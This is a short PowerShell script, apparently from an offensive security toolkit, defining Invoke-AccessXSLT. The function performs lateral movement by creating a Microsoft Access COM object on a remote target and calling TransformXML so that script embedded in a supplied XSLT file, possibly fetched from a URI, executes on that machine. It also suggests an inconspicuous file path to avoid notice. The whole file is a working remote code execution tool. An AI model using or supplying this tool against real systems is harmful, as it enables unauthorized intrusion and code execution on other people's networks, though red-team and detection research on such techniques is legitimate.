<#
    Lateral Movement Via MSACCESS TransformXML
    Author: Philip Tsukerman (@PhilipTsukerman)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
#>

function Invoke-AccessXSLT {
<#
    .DESCRIPTION
    Use Microsoft Access to execute the script embedded in an XSLT sheet
    .PARAMETER Target
    Hostname or IP of the target machine
    .PARAMETER XSLT
    Path of the XSLT to use, can be a URI
    .PARAMETER DatabasePath
    Access will create an empty database. Should be just an inconspicous filepath, as the file itself will contain nothing suspicious
   
#>

    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $false, Position = 0, ValueFromPipeLine = $true, ValueFromPipelineByPropertyName = $true)]
        [String]
        $Target = "127.0.0.1",
        
        [Parameter(Mandatory = $true, Position = 1)]
        [String]
        $XSLT,

        [Parameter(Mandatory = $false, Position = 2)]
        [String]
        $DatabasePath = "C:\Temp\Whatever"
      
    )
    
    
    Process {
        $Access = [activator]::CreateInstance([type]::GetTypeFromProgId("Access.Application", $Target))
        

        Try
        {
            $access.NewCurrentDatabase($DatabasePath)
        }
        
        Catch

        {
            Write-Host "Could not create new database. Make sure there is no other database at the same path on your target."
        }
        

        Try
        {
            $Result = $Access.TransformXML($XSLT, $XSLT, "c:\this\path\does\not\exist.xml", $true, 0)
        }

        Catch
        {
            # This error means that the XSLT transformation itself was executed, but didn't succeed to transform the XML itself, which is okay, because we only wanted to execute the embedded script anyway.
            if ($_.Exception.ErrorCode -eq -2146796699)
            {
                Write-Host "Execution Successful!"
            }

        }
    }

}
   